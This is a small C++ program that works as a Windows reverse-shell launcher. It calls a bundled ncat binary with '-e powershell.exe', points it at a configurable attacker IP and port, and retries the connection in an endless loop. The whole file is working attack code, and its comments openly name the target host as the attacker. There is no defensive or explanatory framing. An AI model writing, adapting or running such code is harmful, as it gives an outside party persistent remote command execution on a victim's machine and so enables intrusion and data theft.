#include <iostream>

using namespace std;	// i know this is bad practice but this a really small program

int main() {
	/*	settings:
	 *	change these to your server ip or device ip if on local network
	 */
	string ncatPath = "C:\\revsh\\n.exe";
	string attackerIP = "192.168.0.100";
	string port = "6969";

	string command = ncatPath + " " + attackerIP + " " + port + " -e powershell.exe";
	cout << command << endl;

	// trying to connect to the attaker forever
	while(true)
		system(command.c_str());
}

